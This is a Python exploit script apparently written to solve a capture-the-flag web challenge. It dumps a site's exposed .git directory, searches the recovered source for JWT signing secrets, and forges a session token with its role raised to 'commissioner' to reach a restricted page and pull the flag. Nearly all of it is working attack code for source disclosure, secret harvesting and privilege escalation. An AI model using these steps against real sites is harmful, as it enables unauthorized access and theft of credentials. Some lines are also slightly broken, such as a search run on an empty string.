#!/usr/bin/env python3
import os, re, subprocess, sys, base64, hmac, hashlib, json, urllib.request, urllib.error

BASE = "https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com"
OUT = "dump"

def sh(cmd):
    print("$", cmd)
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
    print(p.stdout[-4000:])
    if p.returncode != 0:
        print("STDERR:", p.stderr[-2000:])
    return p

# 1. install git-dumper
sh(f"{sys.executable} -m pip install --quiet git-dumper || pip install --quiet git-dumper")
# 2. dump exposed .git
sh(f"git-dumper {BASE}/.git/ {OUT}")

# 3. list recovered files
print("\n########## RECOVERED FILES ##########")
recovered = []
for root, dirs, files in os.walk(OUT):
    if ".git" in root.split(os.sep):
        continue
    for f in files:
        p = os.path.join(root, f)
        recovered.append(p)
        print(p, os.path.getsize(p))

# if working tree wasn't checked out, do it
sh(f"cd {OUT} && git checkout -- . 2>/dev/null; git checkout HEAD -- . 2>/dev/null; git reset --hard 2>/dev/null; ls -la")
recovered = []
for root, dirs, files in os.walk(OUT):
    if os.sep+".git" in root or root.endswith(".git"):
        continue
    for f in files:
        recovered.append(os.path.join(root, f))

print("\n########## SOURCE DUMPS ##########")
SECRET = None
for p in recovered:
    if re.search(r"\.(js|ts|json|env|py|txt|md)$", p) or "env" in os.path.basename(p).lower():
        try:
            data = open(p, "r", encoding="utf-8", errors="replace").read()
        except Exception as e:
            print("skip", p, e); continue
        print(f"\n===== {p} ({len(data)} bytes) =====")
        print(data[:6000])
        for m in re.finditer(r"(?i)(secret|jwt[_-]?secret|sign|token[_-]?secret)\s*[:=]\s*[\"'`]([^\"'`]+)[\"'`]", data):
            print("  >> POSSIBLE SECRET:", m.group(0))
            if SECRET is None:
                SECRET = m.group(2)
        for m in re.finditer(r"[A-Za-z0-9_]{2,15}\{[^}\r\n]{2,120}\}", data):
            print("  >> FLAG-LIKE:", m.group(0))

# 4. grep everything for flag/secret
print("\n########## GREP ##########")
sh(f"grep -rniE 'secret|flag\\{{|zdk\\{{|commissioner|jwt|sign' {OUT} --include='*.js' --include='*.json' --include='*.env' --include='*.ts' --include='*.txt' 2>/dev/null | grep -viv '' | head -80")

print("\nDETECTED SECRET:", repr(SECRET))

# 5. forge with detected secret and fetch flag
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def req(path, cookie=None):
    r = urllib.request.Request(BASE + path)
    r.add_header("User-Agent", "Mozilla/5.0")
    if cookie: r.add_header("Cookie", cookie)
    try:
        resp = urllib.request.urlopen(r, timeout=40)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

st, body = req("/")
import re as _re
mm = _re.search(r"wo_session=([^;]+)", "")
# fetch fresh member token via headers
r = urllib.request.Request(BASE + "/"); r.add_header("User-Agent","x")
resp = urllib.request.urlopen(r, timeout=40)
setck = resp.getheader("Set-Cookie","")
member = _re.search(r"wo_session=([^;]+)", setck).group(1)
H,P,S = member.split(".")
pay = json.loads(base64.urlsafe_b64decode(P+"="*(-len(P)%4)))
print("member payload:", pay)

secrets_to_try = []
if SECRET: secrets_to_try.append(SECRET)

def try_secret(secret):
    p = dict(pay); p["role"] = "commissioner"
    header = {"alg":"HS256","typ":"JWT"}
    h_ = b64u(json.dumps(header,separators=(",",":")))
    p_ = b64u(json.dumps(p,separators=(",",":")))
    sig = b64u(hmac.new(secret.encode(), f"{h_}.{p_}".encode(), hashlib.sha256).digest())
    tok = f"{h_}.{p_}.{sig}"
    st, body = req("/commissioner", cookie=f"wo_session={tok}")
    denied = ("Commissioner access only" in body) or ("league role is" in body)
    print(f"\n=== secret={secret!r} status={st} denied={denied} ===")
    print("COOKIE:", tok)
    if not denied:
        print("*** ACCESS GRANTED ***")
        print(body)
        fl = _re.findall(r"[A-Za-z0-9_]{2,15}\{[^}\r\n]{2,160}\}", body)
        fl = [x for x in fl if not any(b in x for b in ("document","function","window","var "))]
        print("FLAGS:", fl)
        return tok, body, fl
    return None

flag = None
for s in secrets_to_try:
    r_ = try_secret(s)
    if r_:
        flag = r_
        break

with open("flag.txt","w") as f:
    f.write(str(flag))
print("\nDONE, secret=", repr(SECRET))
